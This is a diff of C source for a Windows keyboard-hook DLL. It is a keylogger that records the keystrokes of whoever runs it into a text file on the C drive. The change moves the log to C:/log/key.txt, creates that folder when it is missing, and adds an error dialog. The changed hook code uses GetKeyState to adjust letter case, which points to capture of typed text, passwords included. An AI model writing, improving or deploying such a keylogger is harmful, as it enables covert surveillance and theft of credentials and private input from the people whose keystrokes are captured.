@@ -2,6 +2,8 @@
 
 #include <windows.h>
 #include <stdio.h>
+#include <shlwapi.h>
+#pragma   comment(lib,"shlwapi.lib")
 __declspec(dllexport) HMODULE g_hMdl = NULL ;
 __declspec(dllexport) HHOOK g_hHook = NULL;
 #pragma comment(lib,"user32.lib")
@@ -31,7 +33,14 @@ __declspec(dllexport) LRESULT WINAPI MyHook(int code, WPARAM wParam, LPARAM lPar
         if(!(lParam & 0x80000000)){
             GetModuleFileName(NULL, (LPTSTR)strBuf, sizeof(strBuf));
             p = strrchr(strBuf , '\\');
-            fp = fopen("C:/key.txt", "a+");
+            if(!PathIsDirectory((LPTSTR)"C:/log"))
+                CreateDirectory((LPTSTR)"C:/log", NULL);
+            fp = fopen("C:/log/key.txt", "a+");
+            if (fp == NULL) {
+                printf("create file fail\n");
+                MessageBox(NULL, (LPTSTR)"create file fail", (LPTSTR)"Error", MB_OK);
+            }
+            
             if(GetKeyState (VK_SHIFT) > 0){ //shift键盘没按下
                 if( wParam >= 'A' && wParam <= 'Z')
                     wParam += 32;
